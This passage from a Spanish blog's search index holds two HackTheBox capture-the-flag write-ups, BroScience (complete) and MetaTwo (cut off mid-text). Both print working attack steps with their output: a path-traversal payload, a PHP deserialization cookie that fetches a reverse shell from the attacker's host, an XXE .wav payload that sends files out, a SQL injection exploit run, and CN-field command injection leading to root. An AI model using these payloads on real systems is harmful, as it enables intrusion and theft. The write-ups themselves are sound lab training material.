    "snippet": "Tocaremos una máquina media de HackTheBox. Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de directory transversal podremos ver una manera de conseguir el código para activar la cuenta con una función de tiempo al momento crear la cuenta. Para ganar acceso al sistema nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como www-data. Con una base de datos de Postgresql podremos sacar la contraseña del usuario Bill y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado SSL.Escaneo NMAPRealizamos un escaneo NMAP.❯ nmap 10.10.11.195Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:46 -04Nmap scan report for 10.10.11.195Host is up (0.16s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsNmap done: 1 IP address (1 host up) scanned in 2.32 secondsAnalizando la WebWebEn el sertificado SSL encontramos un correo.            administratror@broscience.htb      Si miramos vemos que podemos logearnos y crear una cuenta.Crear CuentaUna vez creada  vemos esto:Confrim CodeSi intentamos logiarnos, nos dirá que la cuenta no está activada todavía.ErrorEscaneando directorios vemos cosas ineresantes.❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://10.10.11.195/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: https://10.10.11.195/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000002:   301        9 L      28 W       315 Ch      \"images\"                                                                                                               000000624:   301        9 L      28 W       317 Ch      \"includes\"                                                                                                             000000716:   301        9 L      28 W       315 Ch      \"manual\"                                                                                                               000001059:   301        9 L      28 W       319 Ch      \"javascript\"                                                                                                           000001703:   301        9 L      28 W       315 Ch      \"styles\"                                                                                                               Total time: 90.60100Processed Requests: 10082Filtered Requests: 10077Requests/sec.: 111.2791Nmap done: 1 IP address (1 host up) scanned in 2.32 secondsIncludesLa ruta /includes nos llama la atención. Déspues de probar todos el unicó que nos llama la atención es  /img.php.img.phpSi intentamos un directory transversal veremos esto:img.phpBYPASSYNG: Con doble URL ENCODEProbando varios metodos de ofuscación me di cuenta que la barra entra en conflicto, ¿Cómo se soluciona?, bueno podemos aplicar doble URL encodeExelente pregunta, les daré una breve explicacíon: By ChatGPT  Cuando se realiza una codificación de URL, algunos caracteres especiales se reemplazan por secuencias de escape que comienzan con el signo % seguido de un código hexadecimal. Por ejemplo, el caracter / se codifica como %2f.Si se tiene una cadena que ya ha sido codificada previamente y se desea codificarla nuevamente, se debe codificar cada uno de los caracteres que representan los caracteres especiales. En este caso, el % se codifica como %25, y luego el caracter / se codifica como %2f, resultando en la cadena %252f.Sabiendo eso podemos inntear leer el /etc/password podemos usar curl o BurpSuite.Doble URL ENCODEEn el reapeter apuntamos al /etc/passwd./etc/passwdAhora con curl.❯ curl -k 'https://10.10.11.195/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd'root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologintss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/falsemessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinusbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologinsshd:x:108:65534::/run/sshd:/usr/sbin/nologindnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinavahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/falsepulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologinsaned:x:113:121::/var/lib/saned:/usr/sbin/nologincolord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologinDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsebill:x:1000:1000:bill,,,:/home/bill:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinpostgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash_laurel:x:998:998::/var/log/laurel:/bin/falseDirectory TransversalAhora les comparto un script de bash que cree para ahorrar tiempo. Una vez clonado lo ejecutamos y tratamos de ver información de la página de login(login.php). Viendo el codigo del archivo PHP&lt;?phpsession_start();// Check if user is logged in alreadyif (isset($_SESSION['id'])) {    header('Location: /index.php');}// Handle a submitted log in formif (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {    // Check if variables are empty    if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {            include_once 'includes/db_connect.php';                // Check if username:password is correct        $res = pg_prepare($db_conn, \"login_query\", 'SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2');        $res = pg_execute($db_conn, \"login_query\", array($_POST['username'], md5($db_salt . $_POST['password'])));                if (pg_num_rows($res) == 1) {            // Check if account is activated            $row = pg_fetch_row($res);            if ((bool)$row[2]) {                // User is logged in                $_SESSION['id'] = $row[0];                $_SESSION['username'] = $row[1];                $_SESSION['is_admin'] = $row[3];                // Redirect to home page                header('Location: /index.php');            } else {                $alert = \"Account is not activated yet\";            }        } else {            $alert = \"Username or password is incorrect.\";        }    } else {        $alert = \"Please fill in both username and password.\";    }}?&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;BroScience : Log In&lt;/title&gt;        &lt;?php include_once 'includes/header.php'; ?&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;?php include_once 'includes/navbar.php'; ?&gt;        &lt;div class=\"uk-container uk-container-xsmall\"&gt;            &lt;form class=\"uk-form-stacked\" method=\"POST\" action=\"login.php\"&gt;                &lt;fieldset class=\"uk-fieldset\"&gt;                    &lt;legend class=\"uk-legend\"&gt;Log In&lt;/legend&gt;                    &lt;?php                    // Display any alerts                    if (isset($alert)) {                    ?&gt;                    &lt;div uk-alert class=\"uk-alert-&lt;?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?&gt;\"&gt;                            &lt;a class=\"uk-alert-close\" uk-close&gt;&lt;/a&gt;                            &lt;?=$alert?&gt;                        &lt;/div&gt;                    &lt;?php                    }                    ?&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;input name=\"username\" class=\"uk-input\" placeholder=\"Username\"&gt;                    &lt;/div&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;input name=\"password\" class=\"uk-input\" type=\"password\" placeholder=\"Password\"&gt;                    &lt;/div&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;button class=\"uk-button uk-button-default\" type=\"submit\"&gt;Log in&lt;/button&gt;                    &lt;/div&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;a href=\"register.php\"&gt;Create an account&lt;/a&gt;                    &lt;/div&gt;                &lt;/fieldset&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;Viendo el código, intentamos ver el register.php viendo que no hay una ruta sabemos que se encuentra en en el mismo directorio, procedemos a leerlo sin problemas.RegistrerVemos como activar la cuenta.Activation CodeAl seguir analizando vemos que  llama  a includes/utils.php, procedemos a leerlo.Activation CodeSi lo leemos veremos esta función de PHP.FunctionActivando la cuentaNos creamos una cuenta y la interceptamos con BrupSuite, la mandamos al Reapeter la enviamos y copiamos la fecha.DateCon la función PHP ponemos nuestra fecha y nos dara el codigo, Creamos un archivo.php&lt;?phpfunction generate_activation_code() {    $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";    srand(strtotime(\"Fri, 31 Mar 2023 20:59:29 GMT\"));    $activation_code = \"\";    for ($i = 0; $i &lt; 32; $i++) {        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];    }    echo $activation_code;}generate_activation_code()?&gt;Lo ejecutamos…❯ php code.phpHmKj5RgqljPy3516zxzpf2f5S2rBwzn9Copiamos el código y lo ingresamos en:  https://broscience.htb/activate.php?code=Iniciamos sesión y estamos adentro.H4CKED!!!Ganando accsesoRevisamos de nuevo el utils.php y vemos el siguiente codigo:class Avatar {    public $imgPath;    public function __construct($imgPath) {        $this-&gt;imgPath = $imgPath;    }    public function save($tmp) {        $f = fopen($this-&gt;imgPath, \"w\");        fwrite($f, file_get_contents($tmp));        fclose($f);    }}class AvatarInterface {    public $tmp;    public $imgPath;     public function __wakeup() {        $a = new Avatar($this-&gt;imgPath);        $a-&gt;save($this-&gt;tmp);    }}?&gt;La clase avatar tiene un parámetro imgPath que se usa para indicar la ruta de la imagen y un parámetro tmp abre la imagen y guarda su contenido en el servidor.La interfaz de avatar tiene un nombre de método/función __wakeup()que crea una nueva instancia de clase de avatar y un método de guardado de clase para la clase de avatar.Entonces, en teoría, si pudiéramos establecer la ruta img en nuestro servidor y hacer que reciba un shell PHP, la ruta tmp lo almacenará en el servidor y podríamos activar un shell inverso después de activarlo.Utils.php modificadoLo ejecutamos..❯ php utils-avatar.phpTzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjUwL3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==Usando un CookieEditor lo copiamos y lo introducimos en donde dice  user-prefs.CookieNos creamos una una reverse-shell.php con ese nombre y abrimos un servidor python.python -m http.server 80Y nustro Listenig….nc -lvnp 443En el navegador hacemos referencia a ese archivo y Pwned!!!.  Recuerda aplicar el Tratamiento a la TTY  ❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.50] from (UNKNOWN) [10.10.11.195] 35568Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux 19:08:51 up 18:09,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)bash: cannot set terminal process group (1230): Inappropriate ioctl for devicebash: no job control in this shellwww-data@broscience:/$   PWNED!!!Migrando de WWW-DATA a BillSi se acuerdan de la carpata includes había una archivo db_connect.php, lo miramos.www-data@broscience:/var/www/html$ ls includes/db_connect.php\theader.php  img.php  navbar.php  utils.phpwww-data@broscience:/var/www/html$ cat includes/db_connect.php &lt;?php$db_host = \"localhost\";$db_port = \"5432\";$db_name = \"broscience\";$db_user = \"dbuser\";$db_pass = \"RangeOfMotion%777\";$db_salt = \"NaCl\";$db_conn = pg_connect(\"host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}\");if (!$db_conn) {    die(\"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database\");}Vemos claves para una Base de Datos, pero mysql no esta instalado. Pero… vemos un puerto. Buscando en Google vemos que se tratat de postgresql. Usando este blog nos enseñan a conectarnos.www-data@broscience:/var/www/html/includes$ psql -h localhost -p 5432 -d broscience -U dbuser -WPassword: RangeOfMotion%777psql (13.9 (Debian 13.9-0+deb11u1))SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)Type \"help\" for help.broscience=&gt; Mostramos las tablas disponibles.broscience-&gt; \\dt           List of relations Schema |   Name    | Type  |  Owner   --------+-----------+-------+---------- public | comments  | table | postgres public | exercises | table | postgres public | users     | table | postgres(3 rows)Mostramos la data de la tablaoscience=&gt; select * from users; id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          ----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04  6 | mrt420        | 71d63fd0df7f8fb5e5121cbad6754799 | mrt420@mrt.com               | 3SdFiMzFushSzTBvEgP85atGTRBWH9r9 | f            | f        | 2023-03-31 19:32:22.994831-04(6 rows)broscience=&gt; Copiamos los nombres y los hashes MD5. Con ayuda de REGEX podemos darle el formato apropiadocat hash  | sed -E 's/^(\\w+)\\s*\\|\\s*(\\w+)$/\\1:\\2/' &gt; hashsEl hash esta salado, hacemos lo siguiente15657792073e8a843d4f91fc403454e1:NaCl13edad4932da9dbb57d9cd15b66ed104:NaClbd3dad50e2d578ecba87d5fa15ca5f85:NaCla7eed23a7be6fe0d765197b1027453fe:NaCl5d15340bded5b9395d5d14b9c21bc82b:NaCl71d63fd0df7f8fb5e5121cbad6754799:NaClAhora necesitamos el modo correcto, les comparto la siguiente wiki.❯ hashcat -m 20 hashs /usr/share/wordlists/rockyou.txtEn un momento tendremos las contraseñas.PWNED!!!Migramos…su billbill@broscience:~$ cat user.txt be****************************50bill@broscience:~$ Tenemos la priemra flag!Escalada de privilegiosUsando pspy64 para ver procesos de root. Encontramos lo siguiente.PsPyleyendo el contenido nos encontramos con un script de bash.bill@broscience:~$ cat /opt/renew_cert.sh#!/bin/bashif [ \"$#\" -ne 1 ] || [ $1 == \"-h\" ] || [ $1 == \"--help\" ] || [ $1 == \"help\" ]; then    echo \"Usage: $0 certificate.crt\";    exit 0;fiif [ -f $1 ]; then    openssl x509 -in $1 -noout -checkend 86400 &gt; /dev/null    if [ $? -eq 0 ]; then        echo \"No need to renew yet.\";        exit 1;    fi    subject=$(openssl x509 -in $1 -noout -subject | cut -d \"=\" -f2-)    country=$(echo $subject | grep -Eo 'C = .{2}')    state=$(echo $subject | grep -Eo 'ST = .*,')    locality=$(echo $subject | grep -Eo 'L = .*,')    organization=$(echo $subject | grep -Eo 'O = .*,')    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')    commonName=$(echo $subject | grep -Eo 'CN = .*,?')    emailAddress=$(openssl x509 -in $1 -noout -email)    country=${country:4}    state=$(echo ${state:5} | awk -F, '{print $1}')    locality=$(echo ${locality:3} | awk -F, '{print $1}')    organization=$(echo ${organization:4} | awk -F, '{print $1}')    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')    echo $subject;    echo \"\";    echo \"Country     =&gt; $country\";    echo \"State       =&gt; $state\";    echo \"Locality    =&gt; $locality\";    echo \"Org Name    =&gt; $organization\";    echo \"Org Unit    =&gt; $organizationUnit\";    echo \"Common Name =&gt; $commonName\";    echo \"Email       =&gt; $emailAddress\";    echo -e \"\\nGenerating certificate...\";    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;\"$country    $state    $locality    $organization    $organizationUnit    $commonName    $emailAddress    \" 2&gt;/dev/null    /bin/bash -c \"mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\"else    echo \"File doesn't exist\"    exit 1;¿Qué hace este scrript?  ChatGPT: Este script es un archivo de shell (bash) que automatiza la renovación de un certificado de seguridad SSL/TLS en un servidor web mediante el uso de OpenSSL. A continuación, se explican las partes del código:La primera sección del código verifica si el script se ejecuta con un solo argumento que es el archivo de certificado que se va a renovar. Si el usuario proporciona más de un argumento o proporciona una opción de ayuda, se muestra un mensaje de uso y se sale del script.La segunda sección del código comprueba si el archivo de certificado especificado existe. Si existe, se utiliza OpenSSL para verificar la fecha de vencimiento del certificado. Si el certificado no ha caducado todavía, se muestra un mensaje y se sale del script. De lo contrario, se extraen los detalles del sujeto del certificado y se muestran en la salida.La tercera sección del código genera un nuevo certificado autofirmado con la misma información del sujeto que se extrajo del certificado anterior. El nuevo certificado se guarda en un directorio específico y se nombra después del nombre común del sujeto. El certificado anterior se reemplaza por el nuevo certificado recién generado.En resumen, el script automatiza la renovación de un certificado SSL/TLS para un servidor web. Si el certificado existente está a punto de caducar, el script genera un nuevo certificado autofirmado y lo reemplaza en el servidor.Generamos un certificado SSL con el mismo nombre y le injectamos codigo malicioso.openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/ Certificados/broscience.crt -días 1Nos debería quedar así.bill@broscience:~$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1Generating a RSA private key....................................................................................++++.............................++++writing new private key to '/home/bill/Certs/broscience.key'-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:$(chmod +x /bin/bash)En unos minutos nuestra bash será SUID.bill@broscience:~/Certs$ ls -la /bin/bash-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bashHacemos lo siguiente:bill@broscience:~/Certs$ bash -pbash-5.1# whoamirootbash-5.1# Procedemos a leer la flagbash-5.1# cat /root/root.txtda****************************8ebash-5.1# RootedEsa fue la máquina de hoy, ¡Feliz Hackeo!"
  },
  
  {
    "title": "MetaTwo WriteUp",
    "url": "/posts/metatwo-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, wordpress, sql injection, virtual hosting, LFI, XSS",
    "date": "2023-03-20 17:00:00 +0100",
    





    "snippet": "Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press,EnumeraciónIdentificando el OSEnviando trazas ICMP  (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.10.11.186PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=156 ms--- 10.10.11.186 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 156.106/156.106/156.106/0.000 msNMAPSi realizamos un escaneo de puertos, encontramos:❯ nmap 10.10.11.186Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:53 -04Nmap scan report for 10.10.11.186Host is up (0.21s latency).Not shown: 997 closed tcp ports (reset)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 16.43 secondsAnalizando la WebSi intentamos acceder a la web, nos redirige, para solucionar esto hacemos:echo '10.10.11.186   metapress.htb' | tee -a /etc/hostsCone esto arreglamos el problema de virtual hosting.Websi ingresamos a la direcciñon que nos muestra vemos esto:EventsCVE-2022-0739Si miramos el código fuente vemos que usa el plugin booking-press v1.0.10 con una importante (CVE))[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357] si buscamos un exploit para esa versión, encontramos este y este otro.Creamos un evnto y en todos los campos de texto colocamos bookingpress_form.BookingPressAhora vemos el código fuente y buscamos por once y copiamos ese pin. Con el exploit que les compartí podemos dumpear la base de datos.❯ python3 exploit.py -u http://metapress.htb -n 30594111b0- BookingPress PoC-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1-- Count of users:  2|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.||manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|Ahora copiamos el hash y lo intentamos crakear con john.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])Cost 1 (iteration count) is 8192 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuspartylikearockstar (manager)1g 0:00:00:03 DONE (2023-03-24 14:36) 0.2617g/s 28950p/s 28950c/s 28950C/s poochini..music69Use the \"--show --format=phpass\" options to display all of the cracked passwords reliablySession completedPodemos autenticarnos con Word Press.Comprometiendo la máquinaAccedemos al panel de WordPress.WP LoginSi iniciamos sesión podemos ver la versión del CMS de WordPress.WP CMSCVE-2021-29447Encontramos una manera de subir archivos multimedia.WAVExiste una sala de (TryHackMe)[https://tryhackme.com/room/wordpresscve202129447] que nos enseñan esta vulnerabilidad. Creamos un archivo .dtd que intente leer el el /etc/passwd convirtiendo la data en formato base64 y reciviendola con una petición GET en nuestro servidor.Archivo .wav, recuerda cambiar tu IP de la VPN de HackTheBox.❯ echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.36/exploit.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; pwned.wavNuestro archivo exploit.dtd le puedes llamar a tu gusto, pero recuerda cambiar la petición.❯ cat exploit.dtd&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.36/?p=%file;'&gt;\" &gt;Nos creamos un servidor PHP por el puerto 80 y observamos el resultado.php -S 0.0.0.0:80Base64Bingo!, podemos leer el /etc/hosts❯ echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=' | base64 -d;echoroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:109::/nonexistent:/usr/sbin/nologinsshd:x:104:65534::/run/sshd:/usr/sbin/nologinjnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bashsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/falseproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologinftp:x:107:65534::/srv/ftp:/usr/sbin/nologinCOmo vimos que usaba NGINX podemos atentar contra la ruta /etc/nginx/sites-enabled/default y ver mas informacion acerca del sitio.❯ cat exploit.dtd&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default\"&gt;&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 